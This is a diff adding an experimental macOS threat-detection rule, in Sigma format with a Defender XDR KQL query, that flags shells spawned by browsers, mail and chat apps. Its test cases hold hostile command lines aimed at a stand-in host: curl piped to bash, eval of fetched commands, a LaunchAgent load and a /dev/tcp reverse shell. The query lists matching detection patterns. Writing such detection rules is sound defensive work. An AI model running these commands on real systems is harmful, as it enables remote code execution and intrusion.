@@ -1,0 +1,232 @@
+title: T1059.004 — macOS Shell Execution from Suspicious Parent Process
+id: a7f3b8c2-1d4e-4b9c-8e5f-6d2a1c3e4f5b
+status: experimental
+description: |
+    Detects shell process (bash, zsh, sh) execution from parent processes that
+    typically should not spawn shells on macOS. Indicates potential command
+    execution via application vulnerability, malware, or unauthorized script
+    execution. Detection based on MITRE Detection Strategy DET0516 (T1059).
+
+author: Detection Engineering Team
+date: 2026-06-21
+modified: 2026-06-21
+
+# ATT&CK mapping — execution via shell
+tags:
+    - attack.execution
+    - attack.t1059.004
+
+# Sigma logsource — macOS host-based process creation
+logsource:
+    product: macos
+    category: process_creation
+
+# Sigma detection logic — base filtering
+detection:
+    selection_shell_process:
+        ProcessName|endswith:
+            - bash
+            - zsh
+            - sh
+            - ksh
+            - csh
+    selection_suspicious_parent:
+        ParentProcessName|in:
+            - Safari
+            - Chrome
+            - Firefox
+            - Mail
+            - Preview
+            - Finder
+            - Slack
+            - Discord
+            - Zoom
+            - iTunes
+            - VLC
+            - Photos
+            - Electron
+    filter_legitimate:
+        ProcessCommandLine|contains:
+            - xcode
+            - homebrew
+            - .app/Contents
+    condition: selection_shell_process and selection_suspicious_parent and not filter_legitimate
+
+# Test cases
+tests:
+    - name: "Test Case 1: Safari spawning bash with piped curl"
+      description: "Detects Safari spawning bash with curl command piped to bash"
+      process_name: bash
+      parent_process_name: Safari
+      command_line: bash -c "curl http://attacker.com/payload | bash"
+      expected_result: ALERT
+
+    - name: "Test Case 2: Mail application spawning zsh with eval"
+      description: "Detects Mail spawning zsh with eval command (email exploit)"
+      process_name: zsh
+      parent_process_name: Mail
+      command_line: zsh -c "eval $(curl attacker.com/cmd)"
+      expected_result: ALERT
+
+    - name: "Test Case 3: Chrome spawning shell with LaunchAgent"
+      description: "Detects Chrome spawning shell to create LaunchAgent"
+      process_name: sh
+      parent_process_name: Chrome
+      command_line: sh -c "launchctl load ~/Library/LaunchAgents/com.evil.plist"
+      expected_result: ALERT
+
+    - name: "Test Case 4: Legitimate Terminal use"
+      description: "Does NOT alert when Terminal (legitimate shell) launches shell"
+      process_name: bash
+      parent_process_name: Terminal
+      command_line: bash -c "ls -la"
+      expected_result: NO_ALERT
+
+    - name: "Test Case 5: Slack spawning bash with nc"
+      description: "Detects Slack spawning bash with netcat reverse shell"
+      process_name: bash
+      parent_process_name: Slack
+      command_line: bash -i >& /dev/tcp/attacker.com/4444 0>&1
+      expected_result: ALERT
+
+# Sentinel / Defender XDR metadata
+platform: defenderxdr
+rule_type: AnalyticRule
+use_case_id: OS-DET-MAC-001_shell_execution_suspicious_parent
+schedule: 5m
+lookback: 1h
+suppress: DeviceName:4h
+
+prerequisites:
+    - Microsoft Defender XDR Advanced Hunting (DeviceProcessEvents table)
+
+watchlists:
+    - High-Value-Assets
+
+falsepositives:
+    - Development tools (Xcode, VS Code) spawning shells for legitimate builds
+    - Package managers (Homebrew, MacPorts) spawning shells
+    - CI/CD systems (GitHub Actions, Jenkins agents) on developer machines
+    - Web browser extensions running shell scripts
+    - macOS update or system maintenance processes
+
+# Severity — medium for general, elevated for critical assets
+level: medium
+
+# ── KQL query ────────────────────────────────────────────────────────────────
+kql_query: |
+    // Use case ID: OS-DET-MAC-001_shell_execution_suspicious_parent
+    // ATT&CK:      T1059 / T1059.004 — Command and Scripting Interpreter (Unix Shell)
+    // Severity:    medium
+    // Platform:    macOS
+    // Type:        AnalyticRule — alerts on real-time process execution
+
+    let HighValueAssets = toscalar(
+        _GetWatchlist('High-Value-Assets') | summarize make_set(tolower(SearchKey)));
+
+    // ── Base query ──────────────────────────────────────────────────────────
+    DeviceProcessEvents
+    | where Timestamp > ago(1h)
+    | where Platform == "macOS"
+    // Filter to shell processes
+    | where ProcessName in~ ("bash", "zsh", "sh", "ksh", "csh")
+    // Detect suspicious parent processes
+    | where ParentProcessName in~ (
+        "Safari",           // Web browser
+        "Chrome",           // Web browser
+        "Firefox",          // Web browser
+        "Mail",             // Email client
+        "Preview",          // Document viewer
+        "Finder",           // File manager
+        "Slack",            // Chat application
+        "Discord",          // Chat application
+        "Zoom",             // Video conferencing
+        "iTunes",           // Media player
+        "VLC",              // Media player
+        "Photos",           // Photo application
+        "Electron"          // Electron framework
+    )
+    // Exclude legitimate development and build contexts
+    | where ProcessCommandLine !contains "xcode"
+    | where ProcessCommandLine !contains "homebrew"
+    | where ProcessCommandLine !contains ".app/Contents"
+    | where ProcessCommandLine !contains "#!/bin/bash"
+    // High-confidence indicators of malicious execution
+    | where
+        (ProcessCommandLine contains "curl" and ProcessCommandLine contains "|") or
+        (ProcessCommandLine contains "wget" and ProcessCommandLine contains "|") or
+        (ProcessCommandLine contains "$(") or
+        (ProcessCommandLine contains "`") or
+        (ProcessCommandLine contains "base64") or
+        (ProcessCommandLine contains "eval") or
+        (ProcessCommandLine contains "/tmp/") or
+        (ProcessCommandLine contains "LaunchAgent") or
+        (ProcessCommandLine contains "LaunchDaemon") or
+        (ProcessCommandLine contains "nc ") or
+        (ProcessCommandLine contains "ncat")
+    // Severity elevation for high-value assets
+    | extend Severity = case(
+        tolower(DeviceName) in~ (HighValueAssets), "high",
+        "medium"
+    )
+    // Entity extraction and deduplication
+    | summarize
+        AlertCount = count(),
+        FirstSeen = min(Timestamp),
+        LastSeen = max(Timestamp),
+        ProcessNames = make_set(ProcessName),
+        CommandLines = make_set(ProcessCommandLine)
+        by
+        DeviceId,
+        DeviceName,
+        ParentProcessName,
+        InitiatingProcessAccountName,
+        InitiatingProcessAccountDomain,
+        Severity
+    // Final projection for alert
+    | project
+        Timestamp = LastSeen,
+        DeviceId,
+        DeviceName,
+        ParentProcessName,
+        ProcessNames,
+        CommandLines,
+        AccountName = InitiatingProcessAccountName,
+        AccountDomain = InitiatingProcessAccountDomain,
+        AlertCount,
+        FirstSeen,
+        LastSeen,
+        Severity,
+        TechniqueId = "T1059.004",
+        TechniqueName = "Command and Scripting Interpreter — Unix Shell",
+        TacticName = "Execution"
+    | sort by Severity desc, LastSeen desc
+
+# ── Metadata ────────────────────────────────────────────────────────────────
+data_source:
+    primary: DeviceProcessEvents (XDR Advanced Hunting)
+    platform: macOS
+    platform_version: "macOS 10.12+"
+
+enrichment:
+    - field: DeviceName
+      lookup_source: "Jamf or Apple MDM"
+      purpose: "Device type and management status"
+    - field: AccountName
+      lookup_source: "Directory Services"
+      purpose: "User context and privilege level"
+    - field: Severity
+      lookup_source: "High-Value-Assets watchlist"
+      purpose: "Asset criticality-based severity adjustment"
+
+validation:
+    kql_syntax_check: PASS
+    sentinel_validation: PENDING
+    comment: "Rule awaiting validation against lab XDR data"
+
+references:
+    - "https://attack.mitre.org/techniques/T1059/"
+    - "https://attack.mitre.org/techniques/T1059/004/"
+    - "https://learn.microsoft.com/en-us/defender/advanced-hunting-deviceprocessevents-table"
+    - "MITRE Detection Strategy DET0516"
+    - "https://www.jamf.com/blog/when-bash-goes-rogue-how-attackers-abuse-the-shell/"
